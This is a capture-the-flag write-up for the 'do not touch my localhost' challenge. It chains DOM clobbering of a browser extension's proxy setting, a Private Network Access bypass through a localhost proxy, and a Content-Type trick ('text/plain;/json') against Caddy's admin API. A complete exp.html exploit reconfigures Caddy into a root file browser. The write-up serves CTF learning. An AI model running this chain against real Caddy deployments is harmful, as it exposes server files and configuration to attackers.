# write up for do not touch my localhost

### TL;DR

There are two key points in this challenge:

The first one is to control the browser extension to modify the proxy so that newly loaded pages are proxied to localhost, thus bypassing private network access checks.

The second one is to bypass the Content-Type checking in Caddy and modify Caddy's configuration to make it as a file browsing server.

### bypass private network access

You can read the [private network access](https://wicg.github.io/private-network-access/) (PNA) document to understand how it works. It is mentioned in the [document](https://wicg.github.io/private-network-access/#proxies) that, for web pages that use a proxy, its remote address will be considered as the address of the proxy server. So we can bypass the PNA by setting the proxy to localhost.

Since the javascript context of content script(extension) is isolated from the context of page, but they share the same DOM, the first step is to pollute proxy_options with DOM clobbering. 

```js
// code in the content script
window.proxy_options = null;
window.postMessage({
    type: "setProxy",
    options: {"hostname":"1.2.3.4","port":12345}
}, "*")
```

We can use `<a id="proxy_options" href="http://server"></a>` to set proxy_options to our server address, and then load `blocker.js` again to trigger the proxy modification. Then use the meta tag to load our own HTML content.

```html
<a id="proxy_options" href="http://server"></a>
<script src="/static/js/blocker.js"></script>
<meta http-equiv="refresh" content="1; URL='/exp.html'" />
```

We can start a man-in-the-middle server to modify the contents of `exp.html`. First, set the proxy back to localhost, then create an iframe with the same origin as the challenge web service but with uncached pages (e. g., /404). The remote address of this iframe will be assumed to be localhost, thus bypassing the PNA check. Then get the eval function of this iframe and execute fetch to modify Caddy's configuration.

```js
window.postMessage({ type: "setProxy", options: { hostname: "127.0.0.1", port: 8080 } },"*");
setTimeout(function () {
    const iframe = document.createElement("iframe");
    iframe.src = "/404";
    document.body.appendChild(iframe);
    setTimeout(function () {
        iframe.contentWindow.eval('fetch("http://127.0.0.1:2019/config/")');
    }, 100);
}, 100);
```

### modify Caddy's configuration

Caddy will open the administration endpoint by default on the `127.0.0.1:2019`. This [document](https://caddyserver.com/docs/json/apps/http/servers/routes/match/file/) describes how to setting up Caddy as a file server. All we need to do is set "root" to "/" and read the flag from Caddy.

There are two [API](https://caddyserver.com/docs/api) endpoints where you can modify the configuration, and after reading the source code I found some issues with the `/config/` implementation.

```go
// admin.go:911
func handleConfig(w http.ResponseWriter, r *http.Request) error {
	switch r.Method {
	case http.MethodGet:
        // ...
	case http.MethodPost,
		http.MethodPut,
		http.MethodPatch,
		http.MethodDelete:

		// DELETE does not use a body, but the others do
		var body []byte
		if r.Method != http.MethodDelete {
            //It determines whether to load the configuration by checking if the Content-Type contains "/json" or not
			if ct := r.Header.Get("Content-Type"); !strings.Contains(ct, "/json") {
				return APIError{
					HTTPStatus: http.StatusBadRequest,
					Err:        fmt.Errorf("unacceptable content-type: %v; 'application/json' required", ct),
				}
			}

			buf := bufPool.Get().(*bytes.Buffer)
			buf.Reset()
			defer bufPool.Put(buf)

			_, err := io.Copy(buf, r.Body)
			if err != nil {
				return APIError{
					HTTPStatus: http.StatusBadRequest,
					Err:        fmt.Errorf("reading request body: %v", err),
				}
			}
			body = buf.Bytes()
		}

		forceReload := r.Header.Get("Cache-Control") == "must-revalidate"

		err := changeConfig(r.Method, r.URL.Path, body, r.Header.Get("If-Match"), forceReload)
		if err != nil && !errors.Is(err, errSameConfig) {
			return err
		}
    // ...
}
```

According to the policy of [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS), if you do not want to send a preflight request when cross origin, then the request can only be GET or POST request, and the headers which can be set manually are only "Accept"，"Accept-Language"，"Content-Language"，"Content-Type"，"Range". And the  type/subtype combinations of [media type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types) that Content-Type can accept are only "application/x-www-form-urlencoded"，"multipart/form-data"，"text/plain".

But the rule does not restrict the value of the media type parameter, so we can specify a Content-Type like "text/plain;/json" to make Caddy recognize the json we send.

The full exp.html:

```html
<!DOCTYPE html>
<html lang="en">
  <body>
    <script>
      window.postMessage({ type: "setProxy", options: { hostname: "127.0.0.1", port: 8080 } },"*");
      setTimeout(function () {
        const iframe = document.createElement("iframe");
        iframe.src = "/404";
        document.body.appendChild(iframe);
        setTimeout(function () {
          iframe.contentWindow.eval('fetch("http://127.0.0.1:2019/config/",{"method":"POST","body":`{"apps":{"http":{"http_port":8888,"https_port":8443,"servers":{"srv0":{"listen":[":8888"],"routes":[{"handle":[{"handler":"vars","root":"/"},{"browse":{},"handler":"file_server"}],"terminal":true}],"automatic_https":{"disable_redirects":true}}}}}}`,"mode":"no-cors","headers":{"content-type":"text/plain;/json"}})');
        }, 100);
      }, 100);
    </script>
  </body>
</html>
```

